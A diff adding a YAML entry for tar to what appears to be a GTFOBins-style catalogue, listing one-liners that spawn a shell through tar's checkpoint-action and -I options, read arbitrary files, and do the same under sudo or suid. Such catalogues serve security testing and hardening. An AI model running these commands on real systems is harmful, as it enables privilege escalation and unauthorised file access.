@@ -1,0 +1,33 @@
+---
+name: tar
+functions:
+  shell:
+  - code: |-
+      tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+    contexts:
+      sudo:
+      suid:
+        shell: true
+      unprivileged:
+  - code: |-
+      tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
+        shell: false
+      unprivileged:
+  file-read:
+  - code: |-
+      tar cf /dev/stdout /path/to/input-file -I 'tar xO'
+    comment: |-
+      The file is read then passed to the specified command (e.g., `tar xO`) via standard input.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  sudo:
+  - code: |-
+      sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+...
